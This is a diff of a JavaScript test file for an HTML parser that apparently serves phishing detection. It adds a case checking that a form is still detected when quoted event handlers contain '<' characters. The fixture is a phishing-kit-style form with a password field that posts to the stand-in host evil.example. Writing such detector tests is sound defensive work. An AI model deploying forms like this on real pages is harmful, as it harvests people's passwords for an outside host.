@@ -257,6 +257,12 @@ test('a page built to be slow to read is read as quickly as any other (no regex 
   assert.equal(page.title, 'Sign in');
   assert.equal(page.forms[0].external, true);
   assert.deepEqual(page.links, ['/help']);
+  // A "<" inside a quoted handler (common in phishing kits) does not hide the form; an unclosed title is no title.
+  const kit = parse('<title>Foo<form action="https://evil.example/x" onsubmit="return a.length<9"><input type=password onkeyup="if(v<3)x()"></form>', 'https://page.example/');
+  assert.equal(kit.forms.length, 1);
+  assert.equal(kit.forms[0].external, true);
+  assert.equal(kit.forms[0].inputs[0].type, 'password');
+  assert.equal(kit.title, '');
 });
 
 test('an email is not taken for a brand by a word that contains its name', () => {
